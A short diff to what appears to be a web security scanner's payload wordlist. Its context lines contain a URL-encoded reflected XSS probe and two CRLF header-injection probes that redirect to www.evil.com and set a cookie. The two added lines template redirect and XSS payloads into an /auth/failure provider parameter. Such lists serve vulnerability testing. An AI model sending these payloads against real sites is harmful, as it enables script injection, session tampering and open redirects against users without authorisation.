@@ -172,3 +172,5 @@
 /status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
 /www.evil.com/%2E%2E%2F%0D%0ASet-Cookie:coffin=hi;
 /www.evil.com/%2F..%0D%0ASet-Cookie:coffin=hi;
+/auth/failure?provider={{redirect_payload}}
+/auth/failure?provider={{basic_xss}}
